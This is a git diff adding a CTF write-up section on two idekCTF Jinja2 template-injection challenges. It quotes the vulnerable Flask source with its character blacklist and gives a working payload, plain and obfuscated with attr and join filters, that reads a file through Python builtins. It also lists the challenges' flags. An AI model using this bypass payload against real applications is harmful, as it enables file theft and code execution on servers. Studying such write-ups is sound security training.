@@ -94,3 +94,142 @@ https://sgw.chal.imaginaryctf.org/__repl
 ![Main function](Sourceless-Guessy-Web/4.PNG)
 * `idek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}`
 
+# Baby JinJail and jinjail
+* Techniques: `SSTI`
+* Overview two challenge have 1 name box
+* Two challenges same a source code so i use 1 payload for 2 challanges
+* In this challenges i and my brother [Taidh](https://github.com/DauHoangTai) solved
+![Main function](baby-jinjail/1.PNG)
+![Main function](JinJail/1.PNG)
+# Source Code Analysis
+```c
+from flask import Flask, render_template_string, request
+
+app = Flask(__name__)
+blacklist = [ 
+    'request',
+    'config',
+    'self',
+    'class',
+    'flag',
+    '0',
+    '1',
+    '2',
+    '3',
+    '4',
+    '5',
+    '6',
+    '7',
+    '8',
+    '9',
+    '"',
+    '\'',
+    '.',
+    '\\',
+    '`',
+    '%',
+    '#',
+    ]
+
+error_page = 
+        {% extends "layout.html" %}
+        {% block body %}
+        <center>
+           <section class="section">
+              <div class="container">
+                 <h1 class="title">Error :(</h1>
+                 <p>Your request was blocked. Please try again!</p>
+              </div>
+           </section>
+        </center>
+        {% endblock %}
+        
+
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        if not request.form['q']:
+            return render_template_string(error_page)
+
+        if len(request.form) > 1:
+            return render_template_string(error_page)
+
+        query = request.form['q'].lower()
+        if '{' in query and any([bad in query for bad in blacklist]):
+            return render_template_string(error_page)
+
+        page = \
+            
+        {{% extends "layout.html" %}}
+        {{% block body %}}
+        <center>
+           <section class="section">
+              <div class="container">
+                 <h1 class="title">You have entered the raffle!</h1>
+                 <ul class=flashes>
+                    <label>Hey {}! We have received your entry! Good luck!</label>
+                 </ul>
+                 </br>
+              </div>
+           </section>
+        </center>
+        {{% endblock %}}
+          .format(query)
+
+    elif request.method == 'GET':
+        page = \
+            
+        {% extends "layout.html" %}
+        {% block body %}
+        <center>
+            <section class="section">
+              <div class="container">
+                 <h1 class="title">Welcome to the idekCTF raffle!</h1>
+                 <p>Enter your name below for a chance to win!</p>
+                 <form action='/' method='POST' align='center'>
+                    <p><input name='q' style='text-align: center;' type='text' placeholder='your name' /></p>
+                    <p><input value='Submit' style='text-align: center;' type='submit' /></p>
+                 </form>
+              </div>
+           </section>
+        </center>
+        {% endblock %}
+        
+    return render_template_string(page)
+
+
+app.run('0.0.0.0', 1337)
+
+```
+* The challenges only route
+* `q` parameter is not given more than 1 
+* `blacklist` checking elements you input if input duplicate in backlist it will return `false` and `render_template_string(error_page)`
+* Even if `false` it's still return `render_template_string` but template `error_page` not allowed input => `impossible SSTI`
+![Main function](baby-jinjail/3.PNG)
+* If bypass success blacklist it's will return `render_template_string`, inside template have input of you, that's `q`. Used `render_template_string` it will put your input into template => maybe SSTI
+* Important things must bypass `blacklist`
+# IDEA
+* I used this payload below
+```c
+{{cycler.__init__.__globals__.__builtins__.open("flag").read()}}
+```
+* Bypass `.` = `|attr()`
+* Bypass `" '` = `dict()|join`
+# Solution
+* Now i bypas this payload 
+```c
+{{cycler.__init__.__globals__.__builtins__.open("flag").read()}}
+```
+* After bypass
+```c
+{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}
+```
+* Well, finally i have a flag =))) 
+![Main function](baby-jinjail/2.PNG)
+### JinJail
+* The source code same `baby-jinjail` but it's check length of input if you input `> 256` it will return `false` but my payload `< 256` so i used 1 payload for two challenges.
+![Main function](JinJail/2.PNG)
+# FLAG
+* Baby-jinjail `idek{n0w_g0_s0lv3_j1nj41l_pl34se}`
+* JinJail `idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}`
